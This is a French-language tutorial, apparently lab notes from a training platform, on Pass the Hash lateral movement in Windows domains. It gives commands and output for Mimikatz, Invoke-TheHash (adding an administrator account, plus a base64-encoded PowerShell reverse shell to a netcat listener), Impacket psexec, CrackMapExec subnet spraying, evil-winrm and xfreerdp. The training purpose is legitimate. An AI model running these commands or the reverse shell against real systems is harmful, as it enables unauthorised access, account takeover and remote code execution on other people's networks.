# Mouvement Latéral - Windows
Une attaque Pass the Hash (PtH) est une technique dans laquelle un attaquant utilise un hachage de mot de passe au lieu du mot de passe en texte brut pour l'authentification. L'attaquant n'a pas besoin de déchiffrer le hachage pour obtenir un mot de passe en clair. Les attaques PtH exploitent le protocole d'authentification, car le hachage du mot de passe reste statique pour chaque session jusqu'à ce que le mot de passe soit changé.

Comme indiqué dans les sections précédentes, l'attaquant doit disposer de privilèges administratifs ou de privilèges particuliers sur la machine cible pour obtenir un hachage de mot de passe. Les hachages peuvent être obtenus de plusieurs manières, notamment :

Vidage de la base de données SAM locale à partir d'un hôte compromis.
Extraction des hachages de la base de données NTDS (ntds.dit) sur un contrôleur de domaine.
Extraction des hachages de la mémoire (lsass.exe).
Supposons que nous obtenions le hachage du mot de passe (64F12CDDAA88057E06A81B54E73B949B) pour le compte julio du domaine inlanefreight.htb. Voyons comment nous pouvons effectuer des attaques Pass the Hash à partir de machines Windows et Linux.

# Inbtroduction à Windows NTLM
Microsoft Windows New Technology LAN Manager (NTLM) est un ensemble de protocoles de sécurité qui authentifie l'identité des utilisateurs tout en protégeant l'intégrité et la confidentialité de leurs données. NTLM est une solution d'authentification unique (SSO) qui utilise un protocole challenge-response pour vérifier l'identité de l'utilisateur sans lui demander de fournir un mot de passe.

Malgré ses défauts connus, NTLM est encore couramment utilisé pour assurer la compatibilité avec les clients et serveurs hérités, même sur les systèmes modernes. Alors que Microsoft continue de prendre en charge NTLM, Kerberos est devenu le mécanisme d'authentification par défaut dans Windows 2000 et les domaines Active Directory (AD) ultérieurs.

Avec NTLM, les mots de passe stockés sur le serveur et le contrôleur de domaine ne sont pas "salés", ce qui signifie qu'un adversaire avec un hachage de mot de passe peut authentifier une session sans connaître le mot de passe d'origine. Nous appelons cela une attaque Pass the Hash (PtH).

# PassTheHash avec Mimikatz (Windows)
Le premier outil que nous utiliserons pour effectuer une attaque Pass the Hash est Mimikatz. Mimikatz a un module nommé sekurlsa::pth qui nous permet d'effectuer une attaque Pass the Hash en démarrant un processus utilisant le hachage du mot de passe de l'utilisateur. Pour utiliser ce module, nous aurons besoin des éléments suivants :

+ /user - Le nom d'utilisateur que nous voulons emprunter.
+ /rc4 ou /NTLM - Hachage NTLM du mot de passe de l'utilisateur.
+ /domain - Domaine auquel appartient l'utilisateur à emprunter. Dans le cas d'un compte d'utilisateur local, nous pouvons utiliser le nom de l'ordinateur, localhost ou un point (.).
+ /run - Le programme que nous voulons exécuter avec le contexte de l'utilisateur (s'il n'est pas spécifié, il lancera cmd.exe).

```
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null

```

Nous pouvons maintenant utiliser cmd.exe pour exécuter des commandes dans le contexte de l'utilisateur. Pour cet exemple, julio peut se connecter à un dossier partagé nommé julio sur le DC.

![exemple](ressource/pth_julio.jpeg)

# Passez le hachage avec PowerShell Invoke-TheHash (Windows)

Un autre outil que nous pouvons utiliser pour effectuer des attaques Pass the Hash sur Windows est Invoke-TheHash. Cet outil est une collection de fonctions PowerShell pour effectuer des attaques Pass the Hash avec WMI et SMB. Les connexions WMI et SMB sont accessibles via le .NET TCPClient. L'authentification est effectuée en transmettant un hachage NTLM dans le protocole d'authentification NTLMv2. Les privilèges d'administrateur local ne sont pas requis côté client, mais l'utilisateur et le hachage que nous utilisons pour nous authentifier doivent disposer de droits d'administration sur l'ordinateur cible. Pour cet exemple, nous utiliserons l'utilisateur julio et le hachage 64F12CDDAA88057E06A81B54E73B949B.

Lorsque vous utilisez Invoke-TheHash, nous avons deux options : l'exécution de la commande SMB ou WMI. Pour utiliser cet outil, nous devons spécifier les paramètres suivants pour exécuter des commandes sur l'ordinateur cible :

+ target - Nom d'hôte ou adresse IP de la cible.
Nom d'utilisateur - Nom d'utilisateur à utiliser pour l'authentification.
+ Domain - Domaine à utiliser pour l'authentification. Ce paramètre n'est pas nécessaire avec les comptes locaux ou lors de l'utilisation du @domaine après le nom d'utilisateur.
+ Hash - Hachage du mot de passe NTLM pour l'authentification. Cette fonction acceptera le format LM:NTLM ou NTLM.
+ Command - Commande à exécuter sur la cible. Si aucune commande n'est spécifiée, la fonction vérifiera si le nom d'utilisateur et le hachage ont accès à WMI sur la cible.

La commande suivante utilisera la méthode SMB pour l'exécution de la commande afin de créer un nouvel utilisateur nommé mark et d'ajouter l'utilisateur au groupe Administrateurs.

### Invoke-TheHash with SMB
```
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

Nous pouvons également obtenir une connexion shell inversée dans la machine cible. Si vous n'êtes pas familier avec les reverse shells, consultez le module Shells & Payloads sur HTB Academy.

Pour obtenir un shell inversé, nous devons démarrer notre écouteur à l'aide de Netcat sur notre machine Windows, dont l'adresse IP est 172.16.1.5. Nous utiliserons le port 8001 pour attendre la connexion.

### Netcat Listener
```
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```
Pour créer un shell inversé simple à l'aide de PowerShell, nous pouvons visiter https://www.revshells.com/, définir notre IP 172.16.1.5 et le port 8001, et sélectionner l'option PowerShell #3 (Base64), comme indiqué dans l'image suivante.

![reverseshellgenerator](ressource/rshellonline.jpeg)

Nous pouvons maintenant exécuter Invoke-TheHash pour exécuter notre script shell inversé PowerShell sur l'ordinateur cible. Notez qu'au lieu de fournir l'adresse IP, qui est 172.16.1.10, nous utiliserons le nom de machine DC01 (l'un ou l'autre fonctionnerait).

### Invoke-TheHash with WMI
```
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

Le résultat est une connexion shell inversée à partir de l'hôte DC01 (172.16.1.10).

![invoke_the_hash](ressource/pth_invoke_the_hash.jpeg)

## Passez le hachage avec Impacket (Linux)
Impacket dispose de plusieurs outils que nous pouvons utiliser pour différentes opérations telles que l'exécution de commandes et le vidage des informations d'identification, l'énumération, etc. Pour cet exemple, nous effectuerons l'exécution de commandes sur la machine cible à l'aide de PsExec.

### Passez le hachage avec Impacket PsExec
```
dsgsec@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Il existe plusieurs autres outils dans la boîte à outils Impacket que nous pouvons utiliser pour l'exécution de commandes à l'aide d'attaques Pass the Hash, telles que :

+ impacket-wmiexec
+ impacket-atexec
+ impacket-smbexec

# Pass the Hash with CrackMapExec (Linux)
CrackMapExec est un outil de post-exploitation qui permet d'automatiser l'évaluation de la sécurité des grands réseaux Active Directory. Nous pouvons utiliser CrackMapExec pour essayer de nous authentifier auprès de certains ou de tous les hôtes d'un réseau à la recherche d'un hôte où nous pouvons nous authentifier avec succès en tant qu'administrateur local. Cette méthode est également appelée "Password Spraying" et est couverte en profondeur dans le module Active Directory Enumeration & Attacks. Notez que cette méthode peut verrouiller les comptes de domaine, alors gardez à l'esprit la politique de verrouillage de compte du domaine cible et assurez-vous d'utiliser la méthode de compte local, qui tentera une seule tentative de connexion sur un hôte dans une plage donnée en utilisant les informations d'identification fournies si cela est votre intention.
```
dsgsec@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Si nous voulons effectuer les mêmes actions mais essayons de nous authentifier auprès de chaque hôte d'un sous-réseau à l'aide du hachage du mot de passe de l'administrateur local, nous pouvons ajouter --local-auth à notre commande. Cette méthode est utile si nous obtenons un hachage d'administrateur local en vidant la base de données SAM locale sur un hôte et que nous voulons vérifier à combien d'autres hôtes (le cas échéant) nous pouvons accéder en raison de la réutilisation du mot de passe de l'administrateur local. Si nous voyons Pwn3d!, cela signifie que l'utilisateur est un administrateur local sur l'ordinateur cible. Nous pouvons utiliser l'option -x pour exécuter des commandes. Il est courant de voir la réutilisation des mots de passe sur de nombreux hôtes du même sous-réseau. Les organisations utilisent souvent des images Gold avec le même mot de passe administrateur local ou définissent ce mot de passe de la même manière sur plusieurs hôtes pour faciliter l'administration. Si nous rencontrons ce problème lors d'un engagement réel, une excellente recommandation pour le client est d'implémenter la solution de mot de passe de l'administrateur local (LAPS), qui randomise le mot de passe de l'administrateur local et peut être configuré pour le faire tourner sur un intervalle fixe.

```
dsgsec@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator

```

## Passez le hachage avec evil-winrm (Linux)
evil-winrm est un autre outil que nous pouvons utiliser pour nous authentifier à l'aide de l'attaque Pass the Hash avec la communication à distance PowerShell. Si SMB est bloqué ou si nous n'avons pas de droits d'administration, nous pouvons utiliser ce protocole alternatif pour nous connecter à la machine cible.
```
dsgsec@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Passez le hachage avec RDP (Linux)
Nous pouvons effectuer une attaque RDP PtH pour obtenir un accès graphique au système cible à l'aide d'outils tels que xfreerdp.

Il y a quelques mises en garde à cette attaque :

Le mode administrateur restreint, qui est désactivé par défaut, doit être activé sur l'hôte cible ; sinon, vous serez présenté avec l'erreur suivante :

![rdp_session](ressource/rdp_session-4.png)

Cela peut être activé en ajoutant une nouvelle clé de registre DisableRestrictedAdmin (REG_DWORD) sous HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa avec la valeur 0. Cela peut être fait en utilisant la commande suivante :

### Enable Restricted Admin Mode to Allow PtH
```
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![rdpsession_5](ressource/rdp_session-5.png)

Une fois la clé de registre ajoutée, nous pouvons utiliser xfreerdp avec l'option /pth pour obtenir un accès RDP :

### Pass the Hash Using RDP
```
dsgsec@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![rdp_session_new](ressource/rdp_session_new.jpeg)

# Les limites UAC passent le hachage pour les comptes locaux
L'UAC (User Account Control) limite la capacité des utilisateurs locaux à effectuer des opérations d'administration à distance. Lorsque la clé de registre HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy est définie sur 0, cela signifie que le compte administrateur local intégré (RID-500, "Administrateur") est le seul compte local autorisé à effectuer des tâches d'administration à distance. Le définir sur 1 autorise également les autres administrateurs locaux.

```
Remarque : Il existe une exception, si la clé de registre FilterAdministratorToken (désactivée par défaut) est activée (valeur 1), le compte RID 500 (même s'il est renommé) est inscrit à la protection UAC. Cela signifie que le PTH distant échouera sur la machine lors de l'utilisation de ce compte.
```


Ces paramètres sont uniquement pour les comptes administratifs locaux. Si nous avons accès à un compte de domaine avec des droits d'administration sur un ordinateur, nous pouvons toujours utiliser Pass the Hash avec cet ordinateur. Si vous voulez en savoir plus sur LocalAccountTokenFilterPolicy, vous pouvez lire le billet de blog de Will Schroeder Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy.